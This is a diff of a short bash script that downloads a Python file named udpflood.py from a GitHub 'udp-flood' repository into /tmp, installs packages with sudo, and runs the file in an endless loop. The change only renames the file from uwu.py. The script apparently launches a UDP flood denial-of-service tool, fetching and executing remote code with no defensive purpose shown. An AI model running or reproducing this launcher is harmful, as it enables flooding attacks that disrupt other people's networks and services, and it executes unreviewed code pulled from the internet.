@@ -1,7 +1,7 @@
 #!/bin/bash
 clear
-wget -O /tmp/uwu.py 'https://raw.githubusercontent.com/trusinadev/udp-flood/master/udpflood.py'
-chmod +x /tmp/uwu.py
+wget -O /tmp/udpflood.py 'https://raw.githubusercontent.com/trusinadev/udp-flood/master/udpflood.py'
+chmod +x /tmp/udpflood.py
 sudo yum install epel-release -y
 sudo yum install snapd -y
 sudo yum install python38 -y
@@ -17,7 +17,7 @@ cd /tmp
 clear
 while true; do
     clear
-    python3 uwu.py
+    python3 udpflood.py
     case $? in
     130) break ;;
     esac
